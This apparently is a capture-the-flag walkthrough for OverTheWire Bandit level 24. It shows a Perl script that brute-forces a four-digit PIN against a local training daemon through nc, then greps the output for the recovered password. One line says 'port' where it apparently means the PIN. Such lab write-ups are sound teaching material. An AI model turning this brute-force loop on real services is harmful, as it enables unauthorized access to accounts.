# Over the Wire Bandit Walkthrough (Writeup): http://overthewire.org/wargames/bandit/

## Writeup

## Level 24
**Description**
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

**Solution**
I made a perl script that did the brute forcing for me and went to bed. When I woke up, there was the file. To save me some time, the port that I found was between 5650 and 6000.
 
```perl
#!/usr/bin/perl

for (my $i=0;$i<10000;$i++) {
        my $result = sprintf("%04d", $i);
        print $result;
        $command = "echo '<password> " . $result . "' | nc localhost 30002 >> result";
        system($command);
        }
```

All that was left was to cat the result file. I probably should have only printed the success to it. It ended up quite large and I had to grep the file for the password. I figured the word "is" would be near the password and it was.

```bash
bandit24@melinda:/tmp/meohmy$ cat result |grep is
The password of user bandit25 is <password>
```
